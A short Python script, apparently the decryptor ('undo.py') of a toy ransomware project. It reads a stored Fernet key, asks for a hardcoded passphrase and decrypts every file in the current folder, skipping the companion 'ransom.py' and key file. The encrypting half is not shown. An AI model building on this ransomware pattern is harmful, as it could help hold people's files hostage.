import os
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
    if file == "ransom.py":
        continue
    if file == "thekey.key":
        continue
    if file == "undo.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

with open("thekey.key", "rb") as key:
        secretkey = key.read()

secret_phrase = "coollness"

user_phrase = input("enter the secret phrase to decrypt your files\n")

if user_phrase == secret_phrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
    input("congrats! your files are decrypted!")
else:
    input("wrong! close this application then reopen and try again!")